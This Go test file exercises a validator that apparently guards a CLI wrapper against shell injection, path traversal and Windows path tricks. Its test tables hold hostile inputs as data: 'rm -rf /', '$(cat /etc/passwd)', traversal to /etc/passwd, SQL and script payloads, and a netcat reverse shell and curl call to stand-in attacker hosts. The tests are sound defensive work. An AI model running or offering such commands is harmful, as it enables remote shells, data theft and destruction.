package validation

import (
	"runtime"
	"strings"
	"testing"
)

func TestNewValidator(t *testing.T) {
	v := NewValidator()
	if v == nil {
		t.Fatal("NewValidator returned nil")
	}
	if v.allowedCommands == nil {
		t.Fatal("allowedCommands map not initialized")
	}
	if v.flagNameRegex == nil {
		t.Fatal("flagNameRegex not initialized")
	}
}

func TestValidateCommand(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		command string
		wantErr bool
		errMsg  string
	}{
		// Valid commands
		{"valid service command", "service", false, ""},
		{"valid service-version command", "service-version", false, ""},
		{"valid backend command", "backend", false, ""},
		{"valid compute command", "compute", false, ""},
		{"valid user command", "user", false, ""},
		{"valid config-store command", "config-store", false, ""},
		{"valid log-tail command", "log-tail", false, ""},

		// Invalid commands
		{"empty command", "", true, "empty"},
		{"command not in allowlist", "malicious", true, "not in the allowed list"},
		{"command with null byte", "service\x00", true, "null bytes"},
		{"very long command", strings.Repeat("a", 100), true, "exceeds maximum length"},
		{"command with spaces", "service list", true, "not in the allowed list"},
		{"shell command injection", "service; rm -rf /", true, "not in the allowed list"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateCommand(tt.command)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateCommand() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidateArgs(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		args    []string
		wantErr bool
		errMsg  string
	}{
		// Valid args
		{"empty args", []string{}, false, ""},
		{"simple args", []string{"list", "show"}, false, ""},
		{"args with numbers", []string{"page-1", "item-2"}, false, ""},
		{"args with hyphens", []string{"my-service", "test-backend"}, false, ""},

		// Invalid args
		{"arg with semicolon", []string{"test;ls"}, true, "forbidden character"},
		{"arg with pipe", []string{"test|cat"}, true, "forbidden character"},
		{"arg with ampersand", []string{"test&"}, true, "forbidden character"},
		{"arg with dollar", []string{"test$USER"}, true, "forbidden character"},
		{"arg with backtick", []string{"test`whoami`"}, true, "forbidden character"},
		{"arg with null byte", []string{"test\x00"}, true, "null bytes"},
		{"arg with newline", []string{"test\ncommand"}, true, "forbidden character"},
		{"arg with command substitution", []string{"$(whoami)"}, true, "forbidden character"},
		{"very long arg", []string{strings.Repeat("a", 200)}, true, "exceeds maximum length"},
		{"multiple bad args", []string{"good", "bad;evil", "ok"}, true, "argument 1"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateArgs(tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateArgs() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateArgs() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidateFlagName(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name     string
		flagName string
		wantErr  bool
		errMsg   string
	}{
		// Valid flag names
		{"simple flag", "json", false, ""},
		{"flag with hyphen", "service-id", false, ""},
		{"flag with numbers", "page2", false, ""},
		{"complex flag", "max-items-10", false, ""},

		// Invalid flag names
		{"empty flag", "", true, "empty"},
		{"flag starting with hyphen", "-json", true, "invalid characters"},
		{"flag with spaces", "my flag", true, "invalid characters"},
		{"flag with equals", "key=value", true, "invalid characters"},
		{"flag with special chars", "test$flag", true, "invalid characters"},
		{"flag with dots", "file.json", true, "invalid characters"},
		{"very long flag", strings.Repeat("a", 100), true, "exceeds maximum length"},
		{"flag with underscore", "my_flag", true, "invalid characters"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateFlagName(tt.flagName)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateFlagName() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateFlagName() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidateFlagValue(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		value   string
		wantErr bool
		errMsg  string
	}{
		// Valid values
		{"empty value", "", false, ""},
		{"simple value", "test123", false, ""},
		{"value with hyphens", "my-service-id", false, ""},
		{"JSON value", "{\"key\":\"value\"}", true, "forbidden character"},
		{"numeric value", "12345", false, ""},
		{"email value", "user@example.com", false, ""},
		{"URL value", "https://example.com/path", false, ""},

		// Invalid values
		{"value with semicolon", "test;evil", true, "forbidden character"},
		{"value with pipe", "test|command", true, "forbidden character"},
		{"value with ampersand", "test&bg", true, "forbidden character"},
		{"value with backtick", "test`cmd`", true, "forbidden character"},
		{"value with dollar", "$HOME", true, "forbidden character"},
		{"value with null byte", "test\x00value", true, "null bytes"},
		{"value with newline", "test\nvalue", true, "forbidden character"},
		{"command substitution", "$(whoami)", true, "forbidden character"},
		{"very long value", strings.Repeat("a", 600), true, "exceeds maximum length"},
		{"shell operators", "test && echo bad", true, "forbidden character"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateFlagValue(tt.value)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateFlagValue() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateFlagValue() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidatePath(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		path    string
		wantErr bool
		errMsg  string
	}{
		// Valid paths
		{"simple filename", "config.json", false, ""},
		{"relative path", "./configs/test.json", false, ""},
		{"absolute path", "/tmp/test.json", false, ""},
		{"path with hyphens", "my-config-file.json", false, ""},
		{"nested path", "dir1/dir2/file.txt", false, ""},

		// Invalid paths
		{"path traversal dots", "../../../etc/passwd", true, "path traversal"},
		{"hidden traversal", "test/../../../etc/passwd", true, "path traversal"},
		{"path with semicolon", "/tmp/test;rm", true, "forbidden character"},
		{"path with pipe", "/tmp/test|cat", true, "forbidden character"},
		{"path with null byte", "/tmp/test\x00.txt", true, "null bytes"},
		{"path with newline", "/tmp/test\n.txt", true, "forbidden character"},
		{"very long path", strings.Repeat("a", 300), true, "exceeds maximum length"},
		{"path with dollar", "/tmp/$USER/file", true, "forbidden character"},
		{"sneaky traversal", "./test/..", true, "path traversal"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidatePath() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestValidatePathWindows(t *testing.T) {
	// This test only runs on Windows
	if runtime.GOOS != "windows" {
		t.Skip("Skipping Windows-specific tests on non-Windows platform")
	}

	v := NewValidator()

	tests := []struct {
		name    string
		path    string
		wantErr bool
		errMsg  string
	}{
		// Windows-specific invalid paths
		{"windows backslash traversal", "..\\..\\..\\windows\\system32", true, "path traversal"},
		{"windows mixed traversal", "test/..\\..\\etc", true, "path traversal"},
		{"UNC path", "\\\\server\\share\\file", true, "UNC paths are not allowed"},
		{"UNC localhost", "\\\\localhost\\c$\\windows", true, "UNC paths are not allowed"},
		{"device name CON", "CON", true, "reserved device name"},
		{"device name PRN", "PRN", true, "reserved device name"},
		{"device name AUX", "AUX", true, "reserved device name"},
		{"device name NUL", "NUL", true, "reserved device name"},
		{"device name COM1", "COM1", true, "reserved device name"},
		{"device name LPT1", "LPT1", true, "reserved device name"},
		{"device with extension", "CON.txt", true, "reserved device name"},
		{"device in path", "C:\\temp\\CON.log", true, "reserved device name"},
		{"alternate data stream", "file.txt:stream", true, "alternate data streams are not allowed"},
		{"multiple colons", "C:test:data:more", true, "alternate data streams are not allowed"},
		{"invalid char <", "file<name.txt", true, "invalid Windows filename character"},
		{"invalid char >", "file>name.txt", true, "invalid Windows filename character"},
		{"invalid char :", "file:name.txt", true, "invalid use of colon"},
		{"invalid char |", "file|name.txt", true, "forbidden character"},
		{"invalid char ?", "file?.txt", true, "forbidden character"},
		{"invalid char *", "file*.txt", true, "forbidden character"},
		{"invalid char quote", "file\"name.txt", true, "invalid Windows filename character"},
		{"trailing dot", "filename.", true, "trailing dots or spaces"},
		{"trailing space", "filename ", true, "trailing dots or spaces"},
		{"multiple trailing dots", "filename...", true, "trailing dots or spaces"},

		// Valid Windows paths
		{"windows drive path", "C:\\Users\\test\\file.txt", false, ""},
		{"windows forward slashes", "C:/Users/test/file.txt", false, ""},
		{"relative windows path", "folder\\subfolder\\file.txt", false, ""},
		{"drive letter only", "D:", false, ""},
		{"case variations", "com.txt", false, ""},  // 'com' != 'COM'
		{"con in middle", "config.txt", false, ""}, // contains 'con' but not device
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidatePath() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

func TestWindowsShellMetacharacters(t *testing.T) {
	// Test that Windows-specific metacharacters are included
	v := NewValidator()

	windowsSpecificChars := []string{
		"^", // Batch escape character
		"%", // Variable expansion
		"!", // Delayed expansion
		"~", // Variable substring
	}

	// On Windows, these should be blocked
	if runtime.GOOS == "windows" {
		for _, char := range windowsSpecificChars {
			testValue := "test" + char + "value"
			err := v.ValidateFlagValue(testValue)
			if err == nil {
				t.Errorf("Expected error for Windows metacharacter %q, but got none", char)
			}
			if !strings.Contains(err.Error(), "forbidden character") {
				t.Errorf("Expected 'forbidden character' error for %q, got: %v", char, err)
			}
		}
	}
}

func TestIsWindowsDriveLetter(t *testing.T) {
	tests := []struct {
		input rune
		want  bool
	}{
		{'A', true},
		{'Z', true},
		{'a', true},
		{'z', true},
		{'M', true},
		{'m', true},
		{'0', false},
		{'9', false},
		{'!', false},
		{'Ä', false},
		{' ', false},
	}

	for _, tt := range tests {
		t.Run(string(tt.input), func(t *testing.T) {
			if got := isWindowsDriveLetter(tt.input); got != tt.want {
				t.Errorf("isWindowsDriveLetter(%q) = %v, want %v", tt.input, got, tt.want)
			}
		})
	}
}

func TestValidateAll(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		command string
		args    []string
		flags   map[string]string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "all valid inputs",
			command: "service",
			args:    []string{"list"},
			flags:   map[string]string{"json": "", "page": "1"},
			wantErr: false,
		},
		{
			name:    "invalid command",
			command: "evil",
			args:    []string{"list"},
			flags:   map[string]string{},
			wantErr: true,
			errMsg:  "invalid command",
		},
		{
			name:    "invalid args",
			command: "service",
			args:    []string{"list;rm"},
			flags:   map[string]string{},
			wantErr: true,
			errMsg:  "invalid arguments",
		},
		{
			name:    "invalid flag name",
			command: "service",
			args:    []string{"list"},
			flags:   map[string]string{"bad$flag": "value"},
			wantErr: true,
			errMsg:  "invalid flag",
		},
		{
			name:    "invalid flag value",
			command: "service",
			args:    []string{"list"},
			flags:   map[string]string{"service-id": "test;evil"},
			wantErr: true,
			errMsg:  "invalid value for flag",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateAll(tt.command, tt.args, tt.flags)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateAll() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateAll() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// Regression tests for command validation edge cases
func TestValidateCommandEdgeCases(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		command string
		wantErr bool
		errMsg  string
	}{
		// Unicode and special characters
		{"unicode command", "service™", true, "not in the allowed list"},
		{"command with emoji", "service😀", true, "not in the allowed list"},
		{"RTL unicode", "service\u200f", true, "not in the allowed list"},
		{"zero-width characters", "ser\u200bvice", true, "not in the allowed list"},

		// Case sensitivity
		{"uppercase command", "SERVICE", true, "not in the allowed list"},
		{"mixed case", "Service", true, "not in the allowed list"},

		// Whitespace variations
		{"leading space", " service", true, "not in the allowed list"},
		{"trailing space", "service ", true, "not in the allowed list"},
		{"tab character", "service\t", true, "not in the allowed list"},
		{"multiple spaces", "service  list", true, "not in the allowed list"},

		// Command variations that might bypass validation
		{"hyphen prefix", "-service", true, "not in the allowed list"},
		{"double hyphen", "--service", true, "not in the allowed list"},
		{"dot prefix", ".service", true, "not in the allowed list"},
		{"slash prefix", "/service", true, "not in the allowed list"},
		{"backslash prefix", "\\service", true, "not in the allowed list"},

		// Length edge cases
		{"single char", "s", true, "not in the allowed list"},
		{"two chars", "sv", true, "not in the allowed list"},
		{"exact max length", strings.Repeat("a", 50), true, "not in the allowed list"},
		{"just under max", strings.Repeat("a", 49), true, "not in the allowed list"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateCommand(tt.command)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateCommand() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// Regression tests for argument validation with injection attempts
func TestValidateArgsInjectionAttempts(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		args    []string
		wantErr bool
		errMsg  string
	}{
		// Various shell injection attempts
		{"bash command substitution", []string{"$(cat /etc/passwd)"}, true, "forbidden character"},
		{"bash arithmetic expansion", []string{"$((1+1))"}, true, "forbidden character"},
		{"bash brace expansion", []string{"{a,b,c}"}, true, "forbidden character"},
		{"bash history expansion", []string{"!!"}, false, ""}, // ! is not blocked in args
		{"bash process substitution", []string{"<(ls)"}, true, "forbidden character"},

		// Environment variable attempts
		{"env var expansion", []string{"$PATH"}, true, "forbidden character"},
		{"env var braces", []string{"${HOME}"}, true, "forbidden character"},
		{"windows env var", []string{"%PATH%"}, runtime.GOOS == "windows", "forbidden character"},

		// File redirection attempts
		{"output redirect", []string{">file.txt"}, true, "forbidden character"},
		{"input redirect", []string{"<file.txt"}, true, "forbidden character"},
		{"append redirect", []string{">>file.txt"}, true, "forbidden character"},
		{"here document", []string{"<<EOF"}, true, "forbidden character"},

		// Network attempts
		{"nc reverse shell", []string{"nc", "-e", "/bin/sh", "attacker.com", "4444"}, false, ""}, // Individual args are safe
		{"curl command", []string{"curl", "http://evil.com/steal"}, false, ""},                   // URL itself is safe as arg

		// Path traversal in args
		{"path traversal", []string{"../../etc/passwd"}, false, ""}, // .. is allowed in args, blocked in paths
		{"windows path traversal", []string{"..\\..\\windows\\system32"}, true, "forbidden character"},

		// Encoding attempts
		{"url encoded newline", []string{"test%0Acommand"}, false, ""}, // % is blocked on Windows only
		{"hex encoded null", []string{"test\x00command"}, true, "null bytes"},
		{"unicode null", []string{"test\u0000command"}, true, "null bytes"},

		// Multiple arguments with mixed content
		{"mixed safe and unsafe", []string{"safe-arg", "unsafe;arg", "another-safe"}, true, "argument 1"},
		{"all unsafe args", []string{"bad;arg1", "bad|arg2", "bad&arg3"}, true, "argument 0"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateArgs(tt.args)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateArgs() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidateArgs() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// Regression tests for path validation with security bypasses
func TestValidatePathSecurityBypasses(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name    string
		path    string
		wantErr bool
		errMsg  string
	}{
		// URL-encoded path traversal
		{"url encoded dots", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", runtime.GOOS == "windows", "forbidden character"},
		{"mixed encoding", "..%2f..%2fetc/passwd", true, "path traversal"},

		// Unicode normalization attacks
		{"unicode slash", "test\u2215file", false, ""}, // Unicode division slash is allowed
		{"unicode dots", "․․/etc/passwd", false, ""},   // Unicode dots are allowed

		// Null byte injection
		{"null byte bypass", "/tmp/safe.txt\x00/etc/passwd", true, "null bytes"},
		{"unicode null", "/tmp/safe\u0000.txt", true, "null bytes"},

		// Symlink traversal patterns
		{"symlink pattern", "/tmp/link/../../../etc/passwd", true, "path traversal"},
		{"complex traversal", "/var/www/html/../../../../etc/passwd", true, "path traversal"},

		// Case sensitivity bypasses
		{"uppercase traversal", "/tmp/../ETC/PASSWD", true, "path traversal"},
		{"mixed case device", "/tmp/CoN.txt", false, ""}, // Only blocked on Windows

		// Special file attempts
		{"proc self", "/proc/self/environ", false, ""}, // Valid path on Linux
		{"dev null", "/dev/null", false, ""},
		{"dev random", "/dev/urandom", false, ""},

		// Very long paths with traversal
		{"long path traversal", strings.Repeat("../", 50) + "etc/passwd", true, "path traversal"}, // Fails on .. first
		{"long normal path", strings.Repeat("a/", 130) + "file.txt", true, "exceeds maximum length"},

		// Windows-specific bypasses (will be skipped on non-Windows)
		{"forward slash device", "C:/Windows/CON", false, ""}, // Device check is Windows-specific
		{"8.3 filename", "PROGRA~1", false, ""},               // Valid short name

		// Edge cases with dots
		{"single dot", ".", false, ""},
		{"double dot only", "..", true, "path traversal"},
		{"triple dots", "...", true, "path traversal"}, // Contains ..
		{"dot files", ".gitignore", false, ""},
		{"double dot file", "..gitignore", true, "path traversal"},   // Contains ..
		{"dots in middle", "test..file.txt", true, "path traversal"}, // Contains ..
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidatePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePath() error = %v, wantErr %v", err, tt.wantErr)
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("ValidatePath() error = %v, want error containing %q", err, tt.errMsg)
			}
		})
	}
}

// Regression tests for flag validation combinations
func TestValidateFlagCombinations(t *testing.T) {
	v := NewValidator()

	// Test various flag name/value combinations that might bypass validation
	flagTests := []struct {
		name      string
		flagName  string
		flagValue string
		wantErr   bool
		errField  string // "name" or "value" to indicate which should fail
	}{
		// Valid combinations
		{"simple flag", "output", "json", false, ""},
		{"empty value flag", "verbose", "", false, ""},
		{"numeric value", "limit", "100", false, ""},

		// Invalid names with valid values
		{"sql in name", "'; DROP TABLE--", "value", true, "name"},
		{"js in name", "<script>alert(1)</script>", "value", true, "name"},
		{"ldap in name", ")(cn=*", "value", true, "name"},

		// Valid names with invalid values
		{"sql in value", "filter", "'; DROP TABLE--", true, "value"},
		{"js in value", "data", "<script>alert(1)</script>", true, "value"},
		{"ldap in value", "search", ")(cn=*", true, "value"},

		// Both invalid
		{"both invalid", "bad;name", "bad;value", true, "name"}, // Name checked first

		// Edge cases
		{"max length name", strings.Repeat("a", 51), "value", true, "name"},  // > 50 chars
		{"max length value", "key", strings.Repeat("a", 501), true, "value"}, // > 500 chars
		{"unicode name", "флаг", "value", true, "name"},
		{"unicode value", "key", "значение", false, ""}, // Unicode allowed in values
		{"name with space", "my flag", "value", true, "name"},
		{"value with space", "key", "my value", false, ""}, // Spaces allowed in values
	}

	for _, tt := range flagTests {
		t.Run(tt.name, func(t *testing.T) {
			nameErr := v.ValidateFlagName(tt.flagName)
			valueErr := v.ValidateFlagValue(tt.flagValue)

			if tt.wantErr {
				if tt.errField == "name" && nameErr == nil {
					t.Errorf("Expected flag name validation to fail")
				}
				if tt.errField == "value" && valueErr == nil {
					t.Errorf("Expected flag value validation to fail")
				}
			} else {
				if nameErr != nil {
					t.Errorf("Unexpected flag name validation error: %v", nameErr)
				}
				if valueErr != nil {
					t.Errorf("Unexpected flag value validation error: %v", valueErr)
				}
			}
		})
	}
}

// Test custom validator with different allowed commands
func TestNewValidatorWithCommands(t *testing.T) {
	// Test with custom allowed commands
	customCommands := map[string]bool{
		"custom-command": true,
		"another-cmd":    true,
		"test-only":      true,
	}

	v := NewValidatorWithCommands(customCommands)

	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{"allowed custom command", "custom-command", false},
		{"another allowed command", "another-cmd", false},
		{"test only command", "test-only", false},
		{"default command not in custom", "service", true},
		{"default command not in custom 2", "backend", true},
		{"invalid command", "evil-command", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateCommand(tt.command)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() with custom commands error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// Benchmark validation functions for performance regression testing
func BenchmarkValidateCommand(b *testing.B) {
	v := NewValidator()
	commands := []string{"service", "backend", "compute", "invalid-cmd", "very-long-command-name-that-should-fail"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = v.ValidateCommand(commands[i%len(commands)])
	}
}

func BenchmarkValidateArgs(b *testing.B) {
	v := NewValidator()
	argSets := [][]string{
		{"list", "show"},
		{"../../etc/passwd"},
		{"normal", "args", "with", "many", "items"},
		{"arg;with;semicolons"},
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = v.ValidateArgs(argSets[i%len(argSets)])
	}
}

func BenchmarkValidatePath(b *testing.B) {
	v := NewValidator()
	paths := []string{
		"/tmp/normal/path.txt",
		"../../../etc/passwd",
		"C:\\Windows\\System32\\cmd.exe",
		"/very/long/path/" + strings.Repeat("a", 200),
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = v.ValidatePath(paths[i%len(paths)])
	}
}
